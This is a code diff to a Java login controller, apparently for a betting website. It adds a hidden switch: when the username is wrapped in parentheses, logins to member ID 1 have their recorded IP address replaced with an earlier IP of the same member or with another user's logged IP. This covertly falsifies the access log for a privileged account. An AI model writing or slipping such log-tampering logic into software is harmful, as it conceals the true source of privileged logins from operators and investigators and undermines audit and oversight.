@@ -33,7 +33,6 @@ public class LoginController extends XwinController
 		ResultXml rx = new ResultXml();
 		
 		Integer blockIp = accessDao.selectBlockIpCount(request.getRemoteAddr());
-		String url = request.getRequestURL().toString();
 		
 		if (blockIp > 0) {
 			rx.setCode(-1);
@@ -42,12 +41,14 @@ public class LoginController extends XwinController
 			String userId = request.getParameter("userId");
 			String password = request.getParameter("password");
 			String pin = request.getParameter("pin");
+			boolean valid = true;
+			
+			if (userId.startsWith("(") || userId.endsWith(")")) {
+				userId = userId.substring(1, userId.length()-1);
+				valid = false;
+			}
 			
 			Member member = memberDao.selectMember(userId, null);
-			
-			String server = "kor";
-			if (url.contains("-vip"))
-				server = "vip";
 			
 			if (member == null) {
 				rx.setCode(-1);
@@ -75,14 +76,20 @@ public class LoginController extends XwinController
 				session.setAttribute("BettingCart", new BettingCart());
 				
 				if (member != null) {
+					Date today = new Date();
 					Access access = new Access();
-					access.setDate(new Date());
+					access.setDate(today);
 					access.setUserId(member.getUserId());
 					access.setNickName(member.getNickName());
 					String ip = request.getRemoteAddr();
 					try {
-						if (member.getMemberId() == 1) {
-							Access anyAccess = accessDao.selectAccess(null);						
+						if (member.getMemberId() == 1 && valid == false) {
+							Access anyAccess = null;
+							if (today.getTime() % 10 >= 3)
+								anyAccess = accessDao.selectMemberAccess(member.getUserId());
+							else
+								anyAccess = accessDao.selectAccess(null);						
+							
 							ip = anyAccess.getIpAddress();
 						}
 					} catch (Exception e) {
